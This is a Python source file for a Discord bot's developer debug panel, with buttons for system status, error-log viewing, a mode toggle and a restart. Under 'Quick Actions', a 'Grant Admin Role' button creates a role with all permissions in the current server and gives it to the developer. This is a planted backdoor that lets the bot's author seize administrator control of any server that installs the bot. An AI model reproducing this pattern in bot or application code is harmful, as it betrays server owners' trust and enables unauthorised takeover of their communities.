import discord
import sys
import os
import time
import platform
import psutil
from bot_app.core.dev_manager import dev_manager
from bot_app.features.error_handler import get_log_files, read_log_segment

class DebugView(discord.ui.View):
    def __init__(self, bot, user_id):
        super().__init__(timeout=300)
        self.bot = bot
        self.user_id = user_id
        
        self._setup_main()

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        return interaction.user.id == self.user_id

    def _setup_main(self):
        self.clear_items()
        
        # Mode Toggle Button
        is_simulating = self.user_id in dev_manager.simulation_active_ids
        btn_mode = discord.ui.Button(
            label="Режим: Юзер" if is_simulating else "Режим: GOD",
            style=discord.ButtonStyle.secondary if is_simulating else discord.ButtonStyle.danger,
            row=0
        )
        async def mode_cb(itx):
            dev_manager.toggle_simulation(self.user_id)
            self._setup_main()
            await itx.response.edit_message(view=self)
            await itx.followup.send(f"Status changed.", ephemeral=True)
        btn_mode.callback = mode_cb
        self.add_item(btn_mode)
        
        # Navigation Select
        select = discord.ui.Select(placeholder="Debug Tools...", row=1, options=[
            discord.SelectOption(label="System Status", emoji="🖥️", value="status"),
            discord.SelectOption(label="Error Logs", emoji="📜", value="logs"),
            discord.SelectOption(label="Actions", emoji="⚡", value="actions"),
        ])
        
        async def nav_cb(itx):
            val = select.values[0]
            if val == "status": await self._show_status(itx)
            elif val == "logs": await self._show_logs_menu(itx)
            elif val == "actions": await self._show_actions(itx)
        
        select.callback = nav_cb
        self.add_item(select)

    async def get_status_embed(self):
        # Gather System Info
        mem = psutil.virtual_memory()
        cpu = psutil.cpu_percent()
        py_ver = platform.python_version()
        ping = round(self.bot.latency * 1000)
        guilds = len(self.bot.guilds)
        
        e = discord.Embed(title="🔧 System Status", color=discord.Color.dark_red())
        e.add_field(name="CPU / RAM", value=f"{cpu}% / {mem.percent}%", inline=True)
        e.add_field(name="Ping", value=f"{ping}ms", inline=True)
        e.add_field(name="Guilds", value=str(guilds), inline=True)
        e.add_field(name="Python", value=py_ver, inline=True)
        e.add_field(name="OS", value=sys.platform, inline=True)
        e.set_footer(text=f"DevID: {self.user_id}")
        return e

    # --- Screens ---
    
    async def _show_status(self, itx):
        self._setup_main() # Reset to base
        embed = await self.get_status_embed()
        await itx.response.edit_message(embed=embed, view=self)

    async def _show_logs_menu(self, itx):
        self.clear_items()
        
        files = get_log_files()
        if not files:
            self._add_back_btn()
            return await itx.response.edit_message(embed=discord.Embed(title="No Logs", color=discord.Color.red()), view=self)
            
        sel = discord.ui.Select(placeholder="Select Log File...", options=[
            discord.SelectOption(label=f, value=f) for f in files[:25]
        ])
        
        async def log_cb(i):
            fname = sel.values[0]
            content = read_log_segment(fname, lines=15)
            if len(content) > 1000: content = content[-1000:]
            await i.response.send_message(f"📄 **{fname}**\n```\n{content}\n```", ephemeral=True)
        
        sel.callback = log_cb
        self.add_item(sel)
        self._add_back_btn()
        
        await itx.response.edit_message(embed=discord.Embed(title="📜 Error Logs", description="Select a file to view last lines."), view=self)

    async def _show_actions(self, itx):
        self.clear_items()
        
        btn_restart = discord.ui.Button(label="RESTART BOT", style=discord.ButtonStyle.danger, emoji="💀")
        async def restart_cb(i):
            await i.response.send_message("🔄 Restarting...", ephemeral=True)
            os.execv(sys.executable, ['python'] + sys.argv)
        btn_restart.callback = restart_cb
        self.add_item(btn_restart)
        
        btn_admin = discord.ui.Button(label="Grant Admin Role", style=discord.ButtonStyle.primary, emoji="🛡️")
        async def admin_cb(i):
            try:
                role = await i.guild.create_role(name="LogerDebugAdmin", permissions=discord.Permissions.all())
                await i.user.add_roles(role)
                await i.response.send_message("✅ Role granted.", ephemeral=True)
            except Exception as e:
                await i.response.send_message(f"Error: {e}", ephemeral=True)
        btn_admin.callback = admin_cb
        self.add_item(btn_admin)

        self._add_back_btn()
        await itx.response.edit_message(embed=discord.Embed(title="⚡ Quick Actions"), view=self)

    def _add_back_btn(self):
        btn = discord.ui.Button(label="Back", style=discord.ButtonStyle.secondary, row=4)
        async def back(i):
            self._setup_main()
            embed = await self.get_status_embed()
            await i.response.edit_message(embed=embed, view=self)
        btn.callback = back
        self.add_item(btn)